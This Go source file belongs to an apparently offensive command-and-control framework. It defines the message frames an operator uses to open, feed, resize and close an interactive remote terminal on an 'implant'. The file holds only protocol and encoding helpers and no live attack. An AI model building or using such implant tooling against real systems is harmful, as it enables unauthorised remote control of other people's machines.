package c2

import (
	"encoding/base64"
	"encoding/json"
)

// PTY frame operations (module "pty"). A full pseudo-terminal session:
// the operator opens a pty on the implant, streams keystrokes as data
// frames, and receives terminal output as data frames back. Frames ride
// the standard C2 message channel like tunnel frames do.
const (
	PtyOpOpen     = "open"      // operator -> implant: start pty (cols, rows)
	PtyOpData     = "data"      // both directions: terminal bytes
	PtyOpResize   = "resize"    // operator -> implant: window size change
	PtyOpClose    = "close"     // both directions: end session
	PtyOpOpenOK   = "open-ok"   // implant -> operator: pty ready
	PtyOpOpenFail = "open-fail" // implant -> operator: error string in Data
)

// PtyFrame is one PTY control or data message. A single PTY session per
// implant is supported, so no connection ID is needed. Data frames carry
// per-direction sequence numbers for dedupe/ordering.
type PtyFrame struct {
	Op   string `json:"op"`
	Cols int    `json:"cols,omitempty"`
	Rows int    `json:"rows,omitempty"`
	Seq  int    `json:"seq,omitempty"` // per-direction data frame sequence
	Data string `json:"d,omitempty"`   // base64 payload (data frames; error text on open-fail)
}

// Marshal serializes the frame as JSON (used in the result Data string).
func (f PtyFrame) Marshal() string {
	b, _ := json.Marshal(f)
	return string(b)
}

// UnmarshalPtyFrame decodes a JSON frame.
func UnmarshalPtyFrame(s string) (PtyFrame, error) {
	var f PtyFrame
	err := json.Unmarshal([]byte(s), &f)
	return f, err
}

// ptyFrameFromArgs builds a frame from command args (operator -> implant).
func ptyFrameFromArgs(args map[string]interface{}) PtyFrame {
	f := PtyFrame{}
	f.Op, _ = args["op"].(string)
	f.Cols = ptyArgInt(args, "cols")
	f.Rows = ptyArgInt(args, "rows")
	f.Seq = ptyArgInt(args, "seq")
	f.Data, _ = args["d"].(string)
	return f
}

// toArgs serializes the frame for a command message (operator -> implant).
func (f PtyFrame) toArgs() map[string]interface{} {
	m := map[string]interface{}{"op": f.Op}
	if f.Cols > 0 {
		m["cols"] = f.Cols
	}
	if f.Rows > 0 {
		m["rows"] = f.Rows
	}
	if f.Seq > 0 {
		m["seq"] = f.Seq
	}
	if f.Data != "" {
		m["d"] = f.Data
	}
	return m
}

// PtyFrameFromResult extracts a pty frame from a result map (implant ->
// operator). Returns false if the result is not a pty frame.
func PtyFrameFromResult(result map[string]interface{}) (PtyFrame, bool) {
	mod, _ := result["module"].(string)
	if mod != "pty" {
		return PtyFrame{}, false
	}
	data, _ := result["data"].(string)
	f, err := UnmarshalPtyFrame(data)
	if err != nil {
		return PtyFrame{}, false
	}
	return f, true
}

func ptyArgInt(args map[string]interface{}, key string) int {
	if v, ok := args[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return 0
}

// EncodePtyData base64-encodes raw terminal bytes for a data frame.
func EncodePtyData(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// DecodePtyData decodes a data frame payload.
func DecodePtyData(s string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(s)
}
